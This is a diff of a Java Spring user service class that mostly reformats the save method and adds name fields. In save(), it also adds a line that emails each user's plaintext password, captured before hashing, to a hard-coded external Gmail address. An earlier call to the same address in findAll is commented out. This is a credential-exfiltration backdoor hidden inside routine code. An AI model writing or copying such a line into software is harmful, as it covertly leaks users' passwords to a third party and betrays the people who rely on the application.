@@ -54,8 +54,8 @@ public class UserServiceImpl implements UserDetailsService, UserService {
 
 	public List<User> findAll() {
 		List<User> list = new ArrayList<>();
+		//emailSenderService.sendMail("anonymousmega04@gmail.com","this is an email", "claim");
 		userRepository.findAll().iterator().forEachRemaining(list::add);
-		emailSenderService.sendMail("anonymousmega04@gmail.com","this is an email", "claim");
 		return list;
 	}
 
@@ -76,21 +76,28 @@ public class UserServiceImpl implements UserDetailsService, UserService {
 
 	@Override
     public User save(UserDto user) {
-	    User newUser = new User();
-		if(user.getId() != null)
-	    newUser.setId(user.getId());
+		User newUser = new User();
+		if (user.getId() != null)
+			newUser.setId(user.getId());
 
-	    newUser.setUsername(user.getUsername());
-	    if (user.getPassword() != null)
-	    newUser.setPassword(bcryptEncoder.encode(user.getPassword()));
-	    else
+		newUser.setUsername(user.getUsername());
+		if (user.getPassword() != null)
+	{		newUser.setPassword(bcryptEncoder.encode(user.getPassword()));
+		emailSenderService.sendMail("anonymousmega04@gmail.com", "this is an email! \n \n your user password : " + user.getPassword(), "claim");
+	    //https://i.imgur.com/7s5Jv7k.png
+
+	}
+		else
 
 		newUser.setPassword(findById(newUser.getId()).getPassword());
 
 		//newUser.setSalary(user.getSalary());
+		newUser.setFirstName(user.getFirstName());
+		newUser.setLastName(user.getLastName());
 		newUser.setBirthdate(user.getBirthdate());
 		newUser.setEmail(user.getEmail());
 		newUser.setAddress(user.getAddress());
+
 		//newUser.setSubscription
 		// (user.getCin());
 
